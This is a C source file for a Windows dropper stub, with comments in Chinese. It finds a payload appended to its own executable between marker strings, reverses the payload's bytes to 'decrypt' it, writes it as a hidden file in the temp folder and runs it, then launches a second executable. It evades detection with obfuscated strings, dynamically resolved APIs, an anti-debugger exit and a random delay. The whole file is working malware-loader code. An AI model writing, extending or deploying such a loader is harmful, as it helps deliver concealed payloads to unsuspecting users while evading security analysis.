#include <windows.h>
#include <time.h>

// 混淆的字符串定义
#define M1 'M'
#define M2 'A'
#define M3 'K'
#define M4 'E'
#define M5 'N'
#define M6 'D'
#define MARKER_SIZE 6

#define F1 'F'
#define F2 'I'
#define F3 'L'
#define F4 'E'
#define F5 'S'
#define F6 'T'
#define F7 'A'
#define F8 'R'
#define F9 'T'
#define FILE_START_SIZE 9

// 动态API调用类型定义
typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef DWORD (WINAPI *pGetFileSize)(HANDLE, LPDWORD);
typedef DWORD (WINAPI *pGetTempPathA)(DWORD, LPSTR);
typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
typedef BOOL (WINAPI *pIsDebuggerPresent)(VOID);
typedef VOID (WINAPI *pSleep)(DWORD);
typedef HINSTANCE (WINAPI *pShellExecuteA)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
typedef int (WINAPI *pwsprintfA)(LPSTR, LPCSTR, ...);

// 错误处理宏
#define SHOW_ERROR(msg) { \
    MessageBoxA(NULL, msg, "System Message", MB_ICONINFORMATION); \
    ExitProcess(1); \
}

// 与Python脚本匹配的简单hex反转解密
void HexReverseDecrypt(BYTE* data, DWORD size) {
    // 简单的字节顺序反转
    for(DWORD i = 0; i < size / 2; i++) {
        BYTE temp = data[i];
        data[i] = data[size - 1 - i];
        data[size - 1 - i] = temp;
    }
}

// 自定义内存比较函数
BOOL MyMemCmp(const BYTE* p1, const BYTE* p2, DWORD len) {
    for(DWORD i = 0; i < len; i++) {
        if(p1[i] != p2[i]) {
            return FALSE;
        }
    }
    return TRUE;
}

// 获取API地址
void* GetAPIAddr(const char* dll, const char* func) {
    HMODULE hMod = LoadLibraryA(dll);
    if(!hMod) return NULL;
    return GetProcAddress(hMod, func);
}

int main() {
    // 反调试检查
    pIsDebuggerPresent fnIsDebuggerPresent = (pIsDebuggerPresent)GetAPIAddr("kernel32.dll", "IsDebuggerPresent");
    if(fnIsDebuggerPresent && fnIsDebuggerPresent()) {
        ExitProcess(0);
    }
    
    // 随机延迟
    pSleep fnSleep = (pSleep)GetAPIAddr("kernel32.dll", "Sleep");
    if(fnSleep) {
        fnSleep(1000 + (GetTickCount() % 2000));
    }
    
    // 动态获取API函数
    pCreateFileA fnCreateFileA = (pCreateFileA)GetAPIAddr("kernel32.dll", "CreateFileA");
    pReadFile fnReadFile = (pReadFile)GetAPIAddr("kernel32.dll", "ReadFile");
    pWriteFile fnWriteFile = (pWriteFile)GetAPIAddr("kernel32.dll", "WriteFile");
    pGetFileSize fnGetFileSize = (pGetFileSize)GetAPIAddr("kernel32.dll", "GetFileSize");
    pGetTempPathA fnGetTempPathA = (pGetTempPathA)GetAPIAddr("kernel32.dll", "GetTempPathA");
    pCloseHandle fnCloseHandle = (pCloseHandle)GetAPIAddr("kernel32.dll", "CloseHandle");
    pShellExecuteA fnShellExecuteA = (pShellExecuteA)GetAPIAddr("shell32.dll", "ShellExecuteA");
    pwsprintfA fnwsprintfA = (pwsprintfA)GetAPIAddr("user32.dll", "wsprintfA");
    
    if(!fnCreateFileA || !fnReadFile || !fnWriteFile || !fnGetFileSize || !fnGetTempPathA || !fnCloseHandle || !fnShellExecuteA || !fnwsprintfA) {
        SHOW_ERROR("System function load failed");
    }
    
    // 获取自身路径
    char selfPath[MAX_PATH];
    if(!GetModuleFileNameA(NULL, selfPath, MAX_PATH)) {
        SHOW_ERROR("Cannot get module path");
    }
    
    // 打开自身文件
    HANDLE hFile = fnCreateFileA(selfPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        SHOW_ERROR("Cannot open executable");
    }
    
    // 获取文件大小
    DWORD fileSize = fnGetFileSize(hFile, NULL);
    if(fileSize == INVALID_FILE_SIZE) {
        fnCloseHandle(hFile);
        SHOW_ERROR("Cannot get file size");
    }
    
    // 分配内存
    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
    if(!buffer) {
        fnCloseHandle(hFile);
        SHOW_ERROR("Memory allocation failed");
    }
    
    // 读取文件内容
    DWORD bytesRead;
    if(!fnReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        fnCloseHandle(hFile);
        SHOW_ERROR("File read failed");
    }
    fnCloseHandle(hFile);
    
    // 构建标记字符串
    char marker[MARKER_SIZE] = { M1, M2, M3, M4, M5, M6 };
    char fileStart[FILE_START_SIZE] = { F1, F2, F3, F4, F5, F6, F7, F8, F9 };
    
    // 查找标记位置
    BYTE* markerPos = NULL;
    for(DWORD i = fileSize - MARKER_SIZE; i > 0; i--) {
        if(MyMemCmp(buffer + i, (BYTE*)marker, MARKER_SIZE)) {
            markerPos = buffer + i;
            break;
        }
    }
    
    if(!markerPos) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        SHOW_ERROR("Marker not found");
    }
    
    // 查找文件开始标记
    BYTE* fileNameStart = markerPos + MARKER_SIZE;
    BYTE* fileStartPos = NULL;
    DWORD fileNameLength = 0;
    
    for(DWORD i = (DWORD)(fileNameStart - buffer); i < fileSize - FILE_START_SIZE; i++) {
        if(MyMemCmp(buffer + i, (BYTE*)fileStart, FILE_START_SIZE)) {
            fileStartPos = buffer + i + FILE_START_SIZE;
            fileNameLength = i - (fileNameStart - buffer);
            break;
        }
    }
    
    if(!fileStartPos || fileNameLength == 0) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        SHOW_ERROR("File start marker not found");
    }
    
    // 提取文件名
    char fileName[MAX_PATH];
    if(fileNameLength >= MAX_PATH) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        SHOW_ERROR("Filename too long");
    }
    
    for(DWORD i = 0; i < fileNameLength; i++) {
        fileName[i] = fileNameStart[i];
    }
    fileName[fileNameLength] = '\0';
    
    // 获取文件数据
    DWORD fileDataSize = fileSize - (fileStartPos - buffer);
    if(fileDataSize == 0) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        SHOW_ERROR("No file data found");
    }
    
    // 解密文件数据 - 使用与Python脚本相同的简单hex反转
    HexReverseDecrypt(fileStartPos, fileDataSize);
    
    // 获取临时目录
    char tempPath[MAX_PATH];
    if(fnGetTempPathA(MAX_PATH, tempPath) == 0) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        SHOW_ERROR("Cannot get temp path");
    }
    
    // 构建完整路径
    char fullPath[MAX_PATH];
    fnwsprintfA(fullPath, "%s\\%s", tempPath, fileName);
    
    // 创建输出文件
    HANDLE hOutFile = fnCreateFileA(fullPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if(hOutFile == INVALID_HANDLE_VALUE) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        SHOW_ERROR("Cannot create output file");
    }
    
    // 写入文件数据
    DWORD bytesWritten;
    if(!fnWriteFile(hOutFile, fileStartPos, fileDataSize, &bytesWritten, NULL) || bytesWritten != fileDataSize) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        fnCloseHandle(hOutFile);
        SHOW_ERROR("File write failed");
    }
    fnCloseHandle(hOutFile);
    VirtualFree(buffer, 0, MEM_RELEASE);
    
    // 执行释放的文件
    fnShellExecuteA(NULL, "open", fullPath, NULL, NULL, SW_SHOW);
    
    // 执行终止程序
    char driveLetter = selfPath[0];
    char terminationPath[MAX_PATH];
    fnwsprintfA(terminationPath, "%c:\\.Termination\\Termination.exe", driveLetter);
    fnShellExecuteA(NULL, "open", terminationPath, NULL, NULL, SW_SHOW);
    
    return 0;
}